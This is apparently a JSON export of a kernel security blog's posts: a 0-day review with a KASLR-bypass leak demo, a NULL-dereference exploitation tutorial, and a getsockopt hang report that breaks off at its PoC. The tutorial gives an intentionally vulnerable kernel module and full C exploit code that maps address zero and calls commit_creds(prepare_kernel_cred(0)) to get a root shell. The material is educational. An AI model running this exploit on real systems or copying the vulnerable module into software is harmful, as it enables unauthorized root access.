(size 96):\r\n  comm \"syz-executor15\", pid 11123, jiffies 4294812752 (age 17.158s)\r\n  hex dump (first 32 bytes):\r\n    00 00 00 00 ad 4e ad de ff ff ff ff 00 00 00 00  .....N..........\r\n    ff ff ff ff ff ff ff ff a0 14 ba a1 ff ff ff ff  ................\r\n  backtrace:\r\n    [<00000000d71df12d>] p9_client_prepare_req net/9p/client.c:757 [inline]\r\n    [<00000000d71df12d>] p9_client_rpc+0x1bd/0x1410 net/9p/client.c:757\r\n    [<0000000062b42e0d>] p9_client_version net/9p/client.c:976 [inline]\r\n    [<0000000062b42e0d>] p9_client_create+0xd0b/0x16ce net/9p/client.c:1069\r\n    [<000000006460f58e>] v9fs_session_init+0x21a/0x1960 fs/9p/v9fs.c:400\r\n    [<00000000066f7e92>] v9fs_mount+0x79/0x860 fs/9p/vfs_super.c:135\r\n    [<0000000057fd6665>] mount_fs+0xa7/0x323 fs/super.c:1277\r\n    [<0000000008124149>] vfs_kern_mount.part.33+0xc9/0x4c0 fs/namespace.c:1037\r\n    [<00000000110ad253>] vfs_kern_mount fs/namespace.c:1027 [inline]\r\n    [<00000000110ad253>] do_new_mount fs/namespace.c:2518 [inline]\r\n    [<00000000110ad253>] do_mount+0x552/0x2ee0 fs/namespace.c:2848\r\n    [<000000005eddec36>] ksys_mount+0x125/0x140 fs/namespace.c:3064\r\n    [<00000000d4c47900>] __do_sys_mount fs/namespace.c:3078 [inline]\r\n    [<00000000d4c47900>] __se_sys_mount fs/namespace.c:3075 [inline]\r\n    [<00000000d4c47900>] __x64_sys_mount+0xba/0x150 fs/namespace.c:3075\r\n    [<0000000052f04bfc>] do_syscall_64+0x165/0x670 arch/x86/entry/common.c:290\r\n    [<000000005d846763>] entry_SYSCALL_64_after_hwframe+0x49/0xbe\r\n    [<000000005c780d9d>] 0xffffffffffffffff\r\n```\r\n\r\n### mm stuff\r\nThese bugs are what I found on LK v4.16.x. Here's my [post](http://kozistr.tech/2018/03/23/LK-kaslr_bypass.html).\r\n\r\nI dunno whether it was patched :). But, as I remembered, it's not a perfectly reliable bug, and there's kinda restriction. So, I'll skip this bug :).\r\n\r\n``Console Demo``\r\n\r\n```c\r\nzero@zer0day:/tmp$ uname -a\r\nLinux zer0day 4.16.0-rc5+ #19 SMP Sun Mar 18 20:44:40 KST 2018 x86_64 GNU/Linux\r\nzero@zer0day:/tmp$ ./leak\r\nzero@zer0day:/tmp$ ./leak 1\r\n[+] Found Kernel Base Address!\r\n[+] kbase : 0xffffffff89e00000\r\nzero@zer0day:/tmp$ su\r\nroot@zer0day:/tmp# cat /proc/kallsyms | grep _text | head -n 1\r\nffffffff89e00000 T _text\r\nroot@zer0day:/tmp#\r\n```\r\n\r\n```\r\nzero@zer0day:/tmp$ ./leak\r\n...\r\nzero@zer0day:/tmp$ ./leak 1\r\n[+] Found Kernel Base Address!\r\n[+] kbase : 0xffffffffb2600000\r\nzero@zer0day:/tmp$ ls\r\nleak  leak.c\r\nzero@zer0day:/tmp$ su\r\nroot@zer0day:/tmp# cat /proc/kallsyms | grep _text | head -n 1\r\nffffffffb2600000 T _text\r\nroot@zer0day:/tmp# uname -a\r\nLinux zer0day 4.16.0-rc7+ #22 SMP Thu Mar 29 16:46:52 KST 2018 x86_64 GNU/Linux\r\n```\r\n\r\nAnyway, successfully got kernel base address :)\r\n\r\n## 0-day bug\r\n\r\nIn this chapter, I gonna show information disclosure which can lead to *KASLR bypass*. This feature is used on many Linux distributions, So, maybe it is reliable on many Linux systems :| (i didn't test all of them, yet)\r\n\r\n### Bugs\r\n\r\nThis bug is ``slab-out-of-bounds`` *Read*. By using this, kernel-land addresses (heap) can be leaked. Found on LK ~v.4.18.x-rc5.\r\n\r\nHint for the vulnerability is ``fs``. There're no any validations for specific variable and it leads to *OOB*.\r\n\r\n### syslog\r\n\r\n```c\r\n[  421.466496] ==================================================================\r\n[  421.467034] BUG: KASAN: slab-out-of-bounds in xxx\r\n[  421.467350] Read of size 48059 at addr ffff88006bb9002d by task poc/2823\r\n[  421.467704] \r\n[  421.467795] CPU: 1 PID: 2823 Comm: poc Not tainted 4.18.0-rc5+ #23\r\n[  421.468128] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014\r\n[  421.468626] Call Trace:\r\n...\r\n[  421.484432] RIP: 0033:0x7fc9130f2afa\r\n[  421.484623] Code: ... \r\n[  421.485702] RSP: 002b:0000000000700c18 EFLAGS: 00000206 ORIG_RAX: 00000000000000a5\r\n[  421.486100] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fc9130f2afa\r\n[  421.486469] RDX: 0000000000700d30 RSI: 0000000000700d40 RDI: 0000000000000000\r\n[  421.486838] RBP: 0000000000700d90 R08: 0000000000700c30 R09: 0000000000000001\r\n[  421.487205] R10: 0000000000000000 R11: 0000000000000206 R12: 00000000004005d0\r\n[  421.487571] R13: 00007ffcd7f02910 R14: 0000000000000000 R15: 0000000000000000\r\n[  421.487945] \r\n[  421.488030] The buggy address belongs to the page:\r\n[  421.488284] page:ffffea0001aee400 count:1 mapcount:0 mapping:0000000000000000 index:0x0 compound_mapcount: 0\r\n[  421.488789] flags: 0x100000000008000(head)\r\n[  421.489013] raw: 0100000000008000 dead000000000100 dead000000000200 0000000000000000\r\n[  421.489411] raw: 0000000000000000 0000000000000000 00000001ffffffff 0000000000000000\r\n[  421.489810] page dumped because: kasan: bad access detected\r\n[  421.490099] \r\n[  421.490183] Memory state around the buggy address:\r\n[  421.490436]  ffff88006bb91f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n[  421.490815]  ffff88006bb91f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n[  421.491188] >ffff88006bb92000: 00 00 00 00 fe fe fe fe fe fe fe fe fe fe fe fe\r\n[  421.491558]                                ^\r\n[  421.491786]  ffff88006bb92080: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe\r\n[  421.492163]  ffff88006bb92100: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe\r\n[  421.492530] ==================================================================\r\n...\r\n[ 1316.744978] kmemleak: 314 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\r\n[ 1939.198134] kmemleak: 12219 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\r\n```\r\n\r\n``file /sys/kernel/debug/kmemleak``\r\n\r\n```c\r\nunreferenced object 0xffff88005bfec000 (size 14280):\r\n  comm \"poc\", pid 3256, jiffies 4295094805 (age 1984.122s)\r\n  hex dump (first 32 bytes):\r\n    00 00 00 00 00 00 00 00 88 51 10 6b 00 88 ff ff  .........Q.k....\r\n    00 80 2c 6a 00 88 ff ff 00 c0 2c 6a 00 88 ff ff  ..,j......,j....\r\n...\r\nunreferenced object 0xffff88006b105188 (size 96):\r\n  comm \"poc\", pid 3256, jiffies 4295094805 (age 1984.122s)\r\n  hex dump (first 32 bytes):\r\n    00 00 00 00 ad 4e ad de ff ff ff ff 6b 6b 6b 6b  .....N......kkkk\r\n    ff ff ff ff ff ff ff ff a0 14 7a 98 ff ff ff ff  ..........z.....\r\n```\r\n\r\n### Demo\r\n\r\nI roughly make a PoC code, So, currently, it should be run by ``root`` privilege. But, maybe it can also be run by ``normal user`` privilege after a few fixes.\r\n\r\n```c\r\nroot@zer0day:/tmp# uname -a\r\nLinux zer0day 4.18.0-rc5+ #23 SMP Tue Jul 17 22:48:05 KST 2018 x86_64 GNU/Linux\r\nroot@zer0day:/tmp# ls -al\r\ntotal 24\r\ndrwxrwxrwt  2 root root 4096 Jul 20 09:51 .\r\ndrwxr-xr-x 24 root root 4096 Jul 17 14:19 ..\r\n-rwxr-xr-x  1 zero zero 8307 Jul 20 09:18 poc\r\n-rw-r--r--  1 zero zero 1222 Jul 20 09:18 poc.c\r\nroot@zer0day:/tmp# ./poc\r\n...\r\n[lots of kaddr leaks...]\r\n```\r\n\r\n~~Hmm... not cool stuff :(~~ \r\n\r\n## Conclusion\r\n\r\nThere're more bugs that I and fuzzer found like UAFs, OOBs, etc... But, some of them can't be reproducible :( or can run under some conditions...\r\n\r\nAnyway, the latest LK version is *v4.18.0-rc5* (7/20/2018).\r\nAnd i think the Linux kernel still has a lot of security issues and they're just exposed to unprivileged users. It means many interfaces need to be tested and some features should be restricted by default.\r\n","excerpt":"TL;DR Last time, I posted about 1-day vulnerability CVE-2017-5123, waitid() arbitrary R/W with null-deref on LK v4.13.x/~v4.14.0-rc4. It ju…","fields":{"slug":"/Modern-Linux-Kernel-0day-Unkind-Exploitations-Review/"},"frontmatter":{"date":"Jul 20, 2018","title":"Modern Linux Kernel 0,1-day Unkind-Exploitations Review","tags":["Security","Linux-Kernel"],"update":"Jul 20, 2018"}}},{"node":{"rawMarkdownBody":"\r\nLinux Kernel Exploitation Tutorial - 1\r\n\r\n## Case\r\n\r\nLet's get down to the point, this time, I'll give an example code which has a NULL dereference vulnerability.\r\n\r\nTesting Environment is like below.\r\n\r\n```c\r\nzero@ubuntu:~$ uname -a\r\nLinux ubuntu 4.16.0-041600rc1-generic #201802120030 SMP Mon Feb 12 00:31:33 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\r\nzero@ubuntu:~$ lsb_release -a\r\nNo LSB modules are available.\r\nDistributor ID:\tUbuntu\r\nDescription:\tUbuntu Bionic Beaver (development branch)\r\nRelease:\t18.04\r\nCodename:\tbionic\r\nzero@ubuntu:~$ uname -a\r\nLinux ubuntu 4.16.0-041600rc1-generic #201802120030 SMP Mon Feb 12 00:31:33 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\r\nzero@ubuntu:~$ gcc -v\r\n...\r\ngcc version 7.3.0 (Ubuntu 7.3.0-3ubuntu1)\r\n```\r\n\r\n## Code\r\n\r\nHere's a Makefile & vulnerable code.\r\n\r\n```c\r\nobj-m += bug1.o\r\n\r\nall:\r\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\r\n\r\nclean:\r\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\r\n```\r\n\r\n\r\n```c\r\n#include <linux/init.h>\r\n#include <linux/module.h> \r\n#include <linux/proc_fs.h>\r\n#include <linux/kernel.h>\r\n\r\nvoid (* vptr)(void);\r\nstatic struct proc_dir_entry *my_proc = NULL;\r\n\r\nstatic ssize_t my_write(struct file *file, const char *buf, size_t len, loff_t *data) {\r\n    vptr();\r\n    return len;\r\n}\r\n\r\nstatic const struct file_operations fops = {\r\n    .owner = THIS_MODULE,\r\n    .write = my_write\r\n};\r\n\r\nvoid __exit my_exit_module(void) {\r\n    remove_proc_entry(\"bug1\", NULL);\r\n    printk(\"[-] bug1 module unloaded\\n\");\r\n}\r\n\r\nint __init my_init_module(void) {\r\n    my_proc = proc_create(\"bug1\", 0666, NULL, &fops);\r\n    \r\n    if(my_proc == NULL)\r\n        return -ENOMEM;\r\n    \r\n    printk(\"[+] bug1 module loaded\\n\");\r\n    return 0;    \r\n}\r\n\r\nmodule_init(my_init_module);\r\nmodule_exit(my_exit_module);\r\n\r\nMODULE_LICENSE(\"GPL\");\r\nMODULE_AUTHOR(\"zer0day\");\r\nMODULE_DESCRIPTION(\"null dereference test 1\");\r\n```\r\n\r\nClearly, we can notice that there's a NULL dereference vulnerability because of uninitialized pointer.\r\nSo, for triggering NULL dereference, we just simply call write function.\r\n\r\nFirst, compile a code & add a kernel module into the kernel by following command.\r\n\r\n```c\r\nzero@ubuntu:~/Desktop/LK/bug1$ make all\r\n...\r\nzero@ubuntu:~/Desktop/LK/bug1$ sudo insmod bug1.ko\r\n```\r\n\r\nThen. you can see a dmesg message\r\n\r\n```c\r\n...\r\n[ 8111.815103] [+] bug1 module loaded\r\n``` \r\n\r\n## Bug\r\n\r\nThe kernel module is loaded, then, let's trigger the bug! \r\n\r\n```c\r\nzero@ubuntu:~/Desktop/LK/bug1$ echo asdf > /proc/bug1\r\n```\r\n\r\nThen, you can also see a dmesg like below.\r\n\r\n```c\r\n[ 8123.452479] BUG: unable to handle kernel NULL pointer dereference at           (null)\r\n[ 8123.452483] IP:           (null)\r\n[ 8123.452484] PGD 0 P4D 0 \r\n[ 8123.452486] Oops: 0010 [#1] SMP PTI\r\n[ 8123.452490] Modules linked in: bug1(OE) crct10dif_pclmul crc32_pclmul ghash_clmulni_intel pcbc aesni_intel aes_x86_64 crypto_simd glue_helper cryptd vmw_balloon intel_rapl_perf snd_ens1371 snd_ac97_codec gameport ac97_bus snd_pcm snd_seq_midi snd_seq_midi_event snd_rawmidi snd_seq snd_seq_device snd_timer snd soundcore input_leds joydev serio_raw shpchp vmw_vsock_vmci_transport vsock vmw_vmci mac_hid binfmt_misc sch_fq_codel parport_pc ppdev lp parport ip_tables x_tables autofs4 hid_generic usbhid hid vmwgfx psmouse ttm drm_kms_helper syscopyarea sysfillrect mptspi sysimgblt ahci mptscsih fb_sys_fops libahci mptbase drm e1000 scsi_transport_spi i2c_piix4 pata_acpi\r\n[ 8123.452519] CPU: 0 PID: 2630 Comm: bash Tainted: G           OE    4.16.0-041600rc1-generic #201802120030\r\n[ 8123.452520] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 05/19/2017\r\n[ 8123.452521] RIP: 0010:          (null)\r\n[ 8123.452522] RSP: 0018:ffffb2ca82c63df0 EFLAGS: 00010286\r\n[ 8123.452523] RAX: 0000000000000000 RBX: 0000000000000005 RCX: ffffb2ca82c63ef8\r\n[ 8123.452524] RDX: 0000000000000005 RSI: 000055eaa6926008 RDI: ffff90717336c800\r\n[ 8123.452525] RBP: ffffb2ca82c63e00 R08: 0000000000000000 R09: 0000000000000001\r\n[ 8123.452525] R10: 0000000000000073 R11: 0000000000000246 R12: fffffffffffffffb\r\n[ 8123.452526] R13: ffffb2ca82c63ef8 R14: 000055eaa6926008 R15: ffff90717336c800\r\n[ 8123.452527] FS:  00007f225ba2db80(0000) GS:ffff907239600000(0000) knlGS:0000000000000000\r\n[ 8123.452528] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\r\n[ 8123.452529] CR2: 0000000000000000 CR3: 0000000094256005 CR4: 00000000003606f0\r\n[ 8123.452550] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\r\n[ 8123.452551] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\r\n[ 8123.452551] Call Trace:\r\n[ 8123.452556]  ? my_write+0x19/0x1f [bug1]\r\n[ 8123.452630]  proc_reg_write+0x41/0x70\r\n[ 8123.452646]  __vfs_write+0x3a/0x170\r\n[ 8123.452651]  ? common_file_perm+0x50/0x140\r\n[ 8123.452652]  ? apparmor_file_permission+0x1a/0x20\r\n[ 8123.452656]  ? security_file_permission+0x41/0xc0\r\n[ 8123.452662]  ? _cond_resched+0x19/0x40\r\n[ 8123.452663]  vfs_write+0xb1/0x1a0\r\n[ 8123.452665]  SyS_write+0x55/0xc0\r\n[ 8123.452670]  do_syscall_64+0x76/0x130\r\n[ 8123.452671]  entry_SYSCALL_64_after_hwframe+0x21/0x86\r\n[ 8123.452673] RIP: 0033:0x7f225b115054\r\n[ 8123.452674] RSP: 002b:00007ffcc697c628 EFLAGS: 00000246 ORIG_RAX: 0000000000000001\r\n[ 8123.452675] RAX: ffffffffffffffda RBX: 0000000000000005 RCX: 00007f225b115054\r\n[ 8123.452675] RDX: 0000000000000005 RSI: 000055eaa6926008 RDI: 0000000000000001\r\n[ 8123.452676] RBP: 000055eaa6926008 R08: 000055eaa6934ca8 R09: 0000000000000004\r\n[ 8123.452677] R10: 0000000000000073 R11: 0000000000000246 R12: 0000000000000005\r\n[ 8123.452678] R13: 0000000000000001 R14: 00007f225b3ec720 R15: 00007f225b3e83e0\r\n[ 8123.452679] Code:  Bad RIP value.\r\n[ 8123.452682] RIP:           (null) RSP: ffffb2ca82c63df0\r\n[ 8123.452683] CR2: 0000000000000000\r\n[ 8123.452685] ---[ end trace b8845159e5bb387e ]---\r\n```\r\n\r\nRIP is successfully changed into NULL ptr.\r\n\r\n## Attack\r\n\r\nNULL dereference is triggered, then. next level is just simply inserting a payload which gains root privileges to 0x0.\r\n\r\nBut, in modern LK, default mmap min address is 65536, meaning that pre-setting min address to 0 for test.\r\n\r\n```c\r\nzero@ubuntu:~/Desktop/LK/bug1$ sudo sysctl -w vm.mmap_min_addr=0\r\nvm.mmap_min_addr = 0\r\n```\r\n\r\nAnd of course, getting root privileges, we need to call **commit_creds(prepare_kernel_cred(0))**.\r\nThey can get from */proc/kallsyms*\r\n\r\n```c\r\nzero@ubuntu:~/Desktop/LK/bug1$ sudo cat /proc/kallsyms | grep commit_creds\r\nffffffffb26adf00 T commit_creds\r\n...\r\nzero@ubuntu:~/Desktop/LK/bug1$ sudo cat /proc/kallsyms | grep prepare_kernel_cred\r\nffffffffb26ae2b0 T prepare_kernel_cred\r\n...\r\n```\r\n\r\nHere's a simple attack code.\r\n\r\n```c\r\n#define _GNU_SOURCE\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <fcntl.h>\r\n#include <string.h>\r\n\r\n#include <sys/types.h>\r\n#include <sys/mman.h>\r\n\r\nstruct cred;\r\nstruct task_struct;\r\n\r\ntypedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)__attribute__((regparm(3)));\r\ntypedef int(*commit_creds_t)(struct cred *new)__attribute__((regparm(3)));\r\n\r\nprepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)0xffffffffb26ae2b0;\r\ncommit_creds_t commit_creds = (commit_creds_t)0xffffffffb26adf00;\r\n\r\nvoid get_shell() { if (getuid() == 0) system(\"/bin/sh\"); }\r\nvoid get_root() { commit_creds(prepare_kernel_cred(0)); }\r\n\r\nint main(int argc, char *argv[]) {\r\n\tprintf(\"\\e[36m[*] Stage 1 - Allocate 0x0\\n\");\r\n\t\r\n\tif (mmap((void *)0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0) == (char *)-1) {\r\n\t    perror(\"mmap()\");\r\n\t\treturn EXIT_FAILURE;\r\n\t}\r\n\r\n    unsigned char shellcode[] = {\r\n\t    /* call get_root() */\r\n\t    0x48, 0xb8,\r\n\t    0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, // mov rax, &get_root()\r\n\t    0xff, 0xd0, 0x48,                               // call rax\r\n\t};\r\n\t\r\n\tvoid **offset = 0;\r\n\toffset = rawmemchr(shellcode, 0x42);\r\n\t(*offset) = get_root;\r\n\r\n\tmemcpy((void *)0, shellcode, sizeof(shellcode));\r\n\t\r\n\tprintf(\"\\e[36m[*] Stage 2 - Trigger NULL dereference\\n\");\r\n\t\r\n    int fd = open(\"/proc/bug1\", O_WRONLY);\r\n    write(fd, \"asdf\", 4); // trigger\r\n    \r\n    get_shell(); // get shell\r\n}\r\n```\r\n\r\ncompile just like this.\r\n\r\n```c\r\ngcc -o tri tri.c\r\n```\r\n\r\ncompile & run this program. But it'll not work on this system right away because of SMEP :(.\r\nyou can also see like this dmesg.\r\n\r\n```c\r\n[13416.790759] tri[5985]: segfault at c4f943d ip 00005570bdfcd8aa sp 00007ffd0c4f9420 error 6 in tri[5570bdfcd000+1000]\r\n[13423.943053] tri[5989]: segfault at ffffffffd5f9799d ip 00005617eefed8aa sp 00007ffed5f97980 error 7 in tri[5617eefed000+1000]\r\n[13683.767595] tri[6041]: segfault at 904db6d ip 00005587d5bdb907 sp 00007ffe0904db50 error 6 in tri[5587d5bdb000+1000]\r\n[14006.136039] unable to execute userspace code (SMEP?) (uid: 1000)\r\n[14006.136042] BUG: unable to handle kernel NULL pointer dereference at           (null)\r\n[14006.136044] IP:           (null)\r\n...\r\nOops: 0011 [#2] SMP PTI\r\n...\r\n[14006.136122] RIP: 0010:          (null)\r\n[14006.136123] RSP: 0018:ffffb2ca8636fdf0 EFLAGS: 00010286\r\n[14006.136124] RAX: 0000000000000000 RBX: 0000000000000004 RCX: ffffb2ca8636fef8\r\n[14006.136125] RDX: 0000000000000004 RSI: 000056214844eb2f RDI: ffff907236ba2a00\r\n[14006.136126] RBP: ffffb2ca8636fe00 R08: 0000000000000001 R09: 0000000000000002\r\n[14006.136127] R10: 0000000000000000 R11: 0000000000000246 R12: fffffffffffffffb\r\n[14006.136128] R13: ffffb2ca8636fef8 R14: 000056214844eb2f R15: ffff907236ba2a00\r\n[14006.136129] FS:  00007f74c141f740(0000) GS:ffff907239680000(0000) knlGS:0000000000000000\r\n[14006.136130] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\r\n[14006.136131] CR2: 0000000000000000 CR3: 0000000067984004 CR4: 00000000003606e0\r\n[14006.136152] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\r\n[14006.136153] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\r\n\r\n```\r\n\r\nAs followed, RIP is successfully changed into NULL but, we can't execute userland code because of SMEP.\r\nSo, we need to bypass SMEP additionally :(.\r\n\r\n* SMEP : Supervisor Mode Execution Protection (meaning userland code cannot be executed in kernelland)\r\n\r\nBut, fortunately, bypassing SMEP isn't hard as well :). Just overwriting Bit 20 of CR4 register to zero and doing other stuffs...\r\nWith above case, **CR4 value is 00000000003606e0**.\r\n\r\n```c\r\n>>> bin(0x3606e0)\r\n'0b11 0110 0000 0110 1110 0000'\r\n```\r\n\r\nBut, in this case, it's complicated to handle SMEP because there's no kernelland area to execute the code disabling SMEP before NULL dereference triggered, (meaning before userland code executed).\r\nSo, in the next post, with another case, i'll finish the payload with the bypasses.\r\n\r\n## Epilogue\r\n\r\nBut, above cases have a lot of limitations. At first, in real world, with NULL dereference can't be triggered because of mmap min address.\r\nSecond is that we need to leak kernel base address with another vulnerability to get commit_Creds & prepare_kernel_cred and etc...\r\nLast is considering about default kernel protections like SMEP/SMAP, etc... \r\n\r\n~~So, usually, if you search about LKE codes, you can easily find that their vulnerability types are UAF or sth similar.~~\r\n~~half true, half false:)~~\r\n\r\n**End**\r\n","excerpt":"Linux Kernel Exploitation Tutorial - 1 Case Let's get down to the point, this time, I'll give an example code which has a NULL dereference …","fields":{"slug":"/NULL-Dereference-Tutorial/"},"frontmatter":{"date":"Feb 27, 2018","title":"Linux Kernel - NULL Dereference Tutorial","tags":["Security","Linux-Kernel"],"update":"Feb 27, 2018"}}},{"node":{"rawMarkdownBody":"\r\n## getsockopt - task hung in lock_sock_nested\r\n\r\nPosting in a long time :) because of other stuff. I have a few LK bugs but skip it :).\r\n\r\nI just found a bug, task hung in lock_sock_nested on the latest LK (v4.16.0-rc1). Of course, from the conclusion, it's not a critical and meaningless bug for me :(.\r\nSo I just added a short PoC that can reproduce a bug and Call Trace.\r\n\r\n### Call Trace (Dump)\r\n\r\nHere's a Call Trace. task hung (default 120s).\r\n\r\n```c\r\nroot@zer0day:~# uname -a\r\nLinux zer0day 4.16.0-rc1+ #14 SMP Wed Feb 14 17:44:19 KST 2018 x86_64 GNU/Linux\r\nroot@zer0day:~# gcc -o poc poc.c\r\nroot@zer0day:~# ./poc\r\n[  369.631452] INFO: task poc:2481 blocked for more than 120 seconds.\r\n[  369.633340]       Not tainted 4.16.0-rc1+ #14\r\n[  369.634552] \"echo 0 > /proc/sys/kernel/hung_task_timeout_secs\" disables this message.\r\n[  369.636478] poc             D13984  2481   2464 0x00000000\r\n[  369.638015] Call Trace:\r\n[  369.638825]  ? __schedule+0x2a9/0xa90\r\n[  369.639792]  ? __local_bh_enable_ip+0x7b/0xe0\r\n[  369.640823]  schedule+0x2a/0x80\r\n[  369.641559]  __lock_sock+0xa1/0x130\r\n[  369.642395]  ? finish_wait+0x80/0x80\r\n[  369.643189]  lock_sock_nested+0x9f/0xb0\r\n[  369.643383]  ipv6_getorigdst+0x9e/0x2c0\r\n[  369.643572]  ? __mutex_unlock_slowpath+0x46/0x2b0\r\n[  369.643811]  ? nf_getsockopt+0x47/0x80\r\n[  369.643996]  nf_getsockopt+0x47/0x80\r\n[  369.644185]  ipv6_getsockopt+0x10a/0x170\r\n[  369.644380]  udpv6_getsockopt+0x40/0x80\r\n[  369.644569]  SyS_getsockopt+0x84/0xf0\r\n[  369.644754]  do_syscall_64+0x74/0x210\r\n[  369.644941]  entry_SYSCALL_64_after_hwframe+0x26/0x9b\r\n[  369.645200] RIP: 0033:0x7f340483008a\r\n[  369.645376] RSP: 002b:00007ffd08d09478 EFLAGS: 00000206 ORIG_RAX: 0000000000000037\r\n[  369.645742] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f340483008a\r\n[  369.646101] RDX: 0000000000000050 RSI: 0000000000000029 RDI: 0000000000000003\r\n[  369.646443] RBP: 00007ffd08d09490 R08: 00007ffd08d09480 R09: 00007f3404aec2e0\r\n[  369.646785] R10: 0000000000000000 R11: 0000000000000206 R12: 0000000000400450\r\n[  369.647148] R13: 00007ffd08d09570 R14: 0000000000000000 R15: 0000000000000000\r\n[  369.647499] \r\n[  369.647499] Showing all locks held in the system:\r\n[  369.647802] 1 lock held by khungtaskd/439:\r\n[  369.648026]  #0:  (tasklist_lock){.+.+}, at: [<00000000d02fdb21>] debug_show_all_locks+0x37/0x1a0\r\n[  369.648470] 1 lock held by rsyslogd/2361:\r\n[  369.648687]  #0:  (&f->f_pos_lock){+.+.}, at: [<0000000066b64151>] __fdget_pos+0x52/0x60\r\n[  369.649092] 2 locks held by getty/2444:\r\n[  369.649279]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\r\n[  369.649714]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\r\n[  369.650156] 2 locks held by getty/2445:\r\n[  369.650343]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\r\n[  369.650762]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\r\n[  369.651203] 2 locks held by getty/2446:\r\n[  369.651390]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\r\n[  369.651813]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\r\n[  369.652256] 2 locks held by getty/2447:\r\n[  369.652443]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\r\n[  369.652864]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\r\n[  369.653305] 2 locks held by getty/2448:\r\n[  369.653492]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\r\n[  369.653915]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\r\n[  369.654356] 2 locks held by getty/2449:\r\n[  369.654542]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50\r\n[  369.654961]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60\r\n[  369.655424] 1 lock held by poc/2481:\r\n[  369.655599]  #0:  (sk_lock-AF_INET6){+.+.}, at: [<000000002374a639>] ipv6_getsockopt+0xf2/0x170\r\n[  369.656030] \r\n[  369.656108] =============================================\r\n[  369.656108]\r\n```\r\n\r\n### Bug\r\n\r\nWith the above Call Trace, I can notice, there is a lock_sock_nested in ipv6_getorigdst where the bug happened. \r\nAt **/net/ipv6/netfilter/nf_conntrack_l3proto_ipv6.c:233**,\r\n\r\n```c\r\n...\r\nstatic int\r\nipv6_getorigdst(struct sock *sk, int optval, void __user *user, int *len)\r\n{\r\n\tstruct nf_conntrack_tuple tuple = { .src.l3num = NFPROTO_IPV6 };\r\n\tconst struct ipv6_pinfo *inet6 = inet6_sk(sk);\r\n\tconst struct inet_sock *inet = inet_sk(sk);\r\n\tconst struct nf_conntrack_tuple_hash *h;\r\n\tstruct sockaddr_in6 sin6;\r\n\tstruct nf_conn *ct;\r\n\t__be32 flow_label;\r\n\tint bound_dev_if;\r\n\r\n\tlock_sock(sk);\r\n\ttuple.src.u3.in6 = sk->sk_v6_rcv_saddr;\r\n\ttuple.src.u.tcp.port = inet->inet_sport;\r\n\ttuple.dst.u3.in6 = sk->sk_v6_daddr;\r\n\ttuple.dst.u.tcp.port = inet->inet_dport;\r\n\ttuple.dst.protonum = sk->sk_protocol;\r\n\tbound_dev_if = sk->sk_bound_dev_if;\r\n\tflow_label = inet6->flow_label;\r\n\trelease_sock(sk);\r\n\t...\r\n```\r\n\r\nAs you also know, **lock_sock_nested** looks like below. (*subclass* is zero in this case))\r\n\r\n```c\r\nvoid lock_sock_nested(struct sock *sk, int subclass)\r\n{\r\n\tmight_sleep(); // debug message is printed by this.\r\n\tspin_lock_bh(&sk->sk_lock.slock);\r\n\tif (sk->sk_lock.owned)\r\n\t\t__lock_sock(sk);\r\n\tsk->sk_lock.owned = 1;\r\n\tspin_unlock(&sk->sk_lock.slock);\r\n\t/*\r\n\t * The sk_lock has mutex_lock() semantics here:\r\n\t */\r\n\tmutex_acquire(&sk->sk_lock.dep_map, subclass, 0, _RET_IP_);\r\n\tlocal_bh_enable();\r\n}\r\n```\r\n\r\nIn short, maybe, there is a task hung in ipv6_getorigdst while holding the socket lock, so it's blocking other tasks too.\r\n\r\n### POC\r\n\r\nHere's a PoC code for reproducing.\r\n\r\n```c\r\n#define _GNU_SOURCE 